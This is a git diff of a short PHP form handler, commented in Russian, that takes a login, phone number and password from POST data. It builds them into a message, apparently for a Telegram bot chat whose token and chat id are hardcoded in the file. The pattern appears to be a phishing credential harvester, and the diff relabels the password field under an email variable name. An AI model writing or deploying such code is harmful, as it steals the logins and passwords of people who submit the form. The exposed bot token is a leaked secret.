@@ -1,11 +1,13 @@
+
 <?php
 
 /* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
 //Переменная $name,$phone, $mail получает данные при помощи метода POST из формы
-$login = $_POST['login'];
-$password = $_POST['password'];
+$name = $_POST['login'];
+$phone = $_POST['phone'];
+$email = $_POST['password'];
 
 //в переменную $token нужно вставить токен, который нам прислал @botFather
 $token = "1333458185:AAFlY76FG89c9Di23fhHm31L63GGT_U0vwY";
@@ -15,8 +17,9 @@ $chat_id = "-489788663";
 
 //Далее создаем переменную, в которую помещаем PHP массив
 $arr = array(
-  'Логин: ' => $login,
-  'Пароль: ' => $password,
+  'Логин:: ' => $name,
+  'Телефон: ' => $phone,
+  'Пароль::' => $email
 );
 
 //При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
